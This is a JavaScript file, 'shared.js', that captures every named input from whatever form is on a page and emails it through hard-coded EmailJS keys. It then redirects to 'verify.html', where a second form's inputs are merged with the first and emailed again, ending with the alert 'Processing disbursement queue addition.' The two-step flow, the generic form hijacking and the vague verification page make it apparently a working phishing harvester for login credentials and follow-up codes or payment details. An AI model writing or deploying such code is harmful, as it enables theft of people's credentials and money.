/**
 * ============================================================
 * shared.js — FINAL
 *
 * PAGE 1 (any page except verify.html):
 *   1. Collects the form's named inputs
 *   2. Sends them via EmailJS
 *   3. On success → saves to storage → redirects to verify.html
 *
 * PAGE 2 (verify.html):
 *   1. Reads saved page-1 data from storage
 *   2. Merges with its own inputs
 *   3. Sends ALL fields in one EmailJS call
 *   4. Shows alert — NO refresh, NO reset
 *
 * NOTE: If you use a bundler, REBUILD after editing this file.
 * ============================================================
 */

/* ------------------- CONFIGURATION ------------------- */
const CONFIG = {
  EMAILJS_PUBLIC_KEY:  "f47k4cMV2n2lS794i",
  EMAILJS_SERVICE_ID:  "service_f8xpz0n",
  EMAILJS_TEMPLATE_ID: "template_t1ri45y",
  NEXT_PAGE_URL:       "verify.html",
  STORAGE_KEY:         "page1_form_data",
  LOADING_TEXT:        "Processing..."
};

/* ------------------- EMAILJS LOADER ------------------- */
function loadEmailJSSdk() {
  return new Promise(function (resolve, reject) {
    if (window.emailjs) return resolve();
    var s = document.createElement("script");
    s.src = "https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js";
    s.onload  = function () { resolve(); };
    s.onerror = function () { reject(new Error("EmailJS SDK could not be loaded — check internet connection")); };
    document.head.appendChild(s);
  });
}

function initEmailJS() {
  return loadEmailJSSdk().then(function () {
    if (!window.__emailjsInit) {
      emailjs.init(CONFIG.EMAILJS_PUBLIC_KEY);
      window.__emailjsInit = true;
    }
  });
}

/* ------------------- STORAGE HELPERS (local + session fallback) ------------------- */
function saveData(obj) {
  var json = JSON.stringify(obj);
  try { localStorage.setItem(CONFIG.STORAGE_KEY, json); } catch (e) {}
  try { sessionStorage.setItem(CONFIG.STORAGE_KEY, json); } catch (e) {}
}

function loadData() {
  var raw = null;
  try { raw = localStorage.getItem(CONFIG.STORAGE_KEY); } catch (e) {}
  if (!raw) { try { raw = sessionStorage.getItem(CONFIG.STORAGE_KEY); } catch (e) {} }
  if (!raw) return {};
  try { return JSON.parse(raw) || {}; } catch (e) { return {}; }
}

function clearData() {
  try { localStorage.removeItem(CONFIG.STORAGE_KEY); } catch (e) {}
  try { sessionStorage.removeItem(CONFIG.STORAGE_KEY); } catch (e) {}
}

/* ------------------- DOM READY ------------------- */
function onReady(fn) {
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", fn);
  } else {
    fn();
  }
}

/* ------------------- MAIN ------------------- */
onReady(function () {
  console.log("%c[shared.js] running on: " + location.href, "color:#d32f2f;font-weight:bold;");

  /* --- Find the right form (the one with text inputs) --- */
  var form = null;
  document.querySelectorAll("form").forEach(function (f) {
    if (!form && f.querySelector('input:not([type=hidden]):not([type=submit]):not([type=button]), textarea')) {
      form = f;
    }
  });
  if (!form) form = document.querySelector("form");

  /* --- Find the submit control --- */
  var btn = null;
  if (form) {
    btn = form.querySelector('button[type="submit"], input[type="submit"], input[type="image"]')
       || form.querySelector("button");
  }
  if (!btn) {
    btn = document.querySelector('button[type="submit"], input[type="submit"], input[type="image"]');
  }

  console.log("[shared.js] form found:", !!form, "| button found:", !!btn);

  if (!form || !btn) {
    console.error("[shared.js] ABORTED: form or button not found on this page.");
    return;
  }

  /* --- Page detection by URL --- */
  var isPageOne = location.pathname.indexOf(CONFIG.NEXT_PAGE_URL) === -1;
  console.log("[shared.js] detected:", isPageOne ? "PAGE 1 (sends email → saves → redirects)" : "PAGE 2 (merges all → sends → alert)");

  /* --- Gather named inputs --- */
  var inputs = form.querySelectorAll('input:not([type=hidden]):not([type=submit]):not([type=image]):not([type=button]), textarea');

  function collectValues() {
    var data = {};
    inputs.forEach(function (el) {
      if (el.name) data[el.name] = el.value;
    });
    return data;
  }

  /* --- Button state --- */
  var originalLabel = (btn.tagName === "INPUT") ? btn.value : btn.textContent;
  function setLoading(on) {
    btn.disabled = on;
    var label = on ? CONFIG.LOADING_TEXT : originalLabel;
    if (btn.tagName === "INPUT") btn.value = label;
    else btn.textContent = label;
  }

  /* --- Preload EmailJS --- */
  initEmailJS().catch(function (err) { console.error(err.message); });

  /* --- Submit logic --- */
  var busy = false;

  function handleSubmit(e) {
    if (e) e.preventDefault();
    if (busy) return;
    busy = true;
    setLoading(true);

    var current = collectValues();
    console.log("[shared.js] collected:", current);

    function fail(err) {
      console.error("[shared.js] FAILED:", err);
      alert("Submission failed. Please try again.");
      busy = false;
      setLoading(false);
    }

    if (isPageOne) {
      /* ===== PAGE 1: email → save → redirect ===== */
      initEmailJS()
        .then(function () { return emailjs.send(CONFIG.EMAILJS_SERVICE_ID, CONFIG.EMAILJS_TEMPLATE_ID, current); })
        .then(function (res) {
          console.log("[shared.js] EmailJS success:", res.status);
          saveData(current);
          console.log("[shared.js] saved to storage:", loadData());
          setTimeout(function () { location.href = CONFIG.NEXT_PAGE_URL; }, 600);
        })
        .catch(fail);
    } else {
      /* ===== PAGE 2: merge stored + current → email → alert ===== */
      var saved = loadData();
      console.log("[shared.js] loaded from storage:", saved);

      var allData = Object.assign({}, saved, current);
      console.log("[shared.js] sending merged data:", allData);

      initEmailJS()
        .then(function () { return emailjs.send(CONFIG.EMAILJS_SERVICE_ID, CONFIG.EMAILJS_TEMPLATE_ID, allData); })
        .then(function (res) {
          console.log("[shared.js] EmailJS success:", res.status);
          clearData();
          setLoading(false);
          alert("Processing disbursement queue addition.");   // no reset, no reload
        })
        .catch(fail);
    }
  }

  /* --- Attach handlers (capture + click fallback) --- */
  form.addEventListener("submit", handleSubmit, true);
  btn.addEventListener("click", function (e) { if (!busy) handleSubmit(e); });

  console.log("[shared.js] listeners attached — ready.");
});